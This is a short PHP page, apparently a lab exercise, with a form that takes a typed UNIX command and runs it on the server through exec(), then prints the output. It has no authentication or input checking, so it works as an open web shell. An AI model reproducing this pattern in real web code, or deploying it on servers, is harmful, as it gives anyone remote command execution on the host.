<html>
<body>
<?php
if(isset($_POST) && $_POST['unix_com'] == "Enter") {
?>
<h3>Unix Command Output:</h3>
<hr>
<?php
	$output = array();
	exec($_POST['command'], $output);
	for($i = 0; $i < count($output); $i++) {
		echo $output[$i].'<br>';
	}
}
else {
?>
<form action="p1b.php" method="post">
<label>Enter UNIX Command:</label>
<input type="text" name="command"><br>
<input type="submit" value="Enter" name="unix_com">
</form>
<?php 
}
?>
</body>
</html>
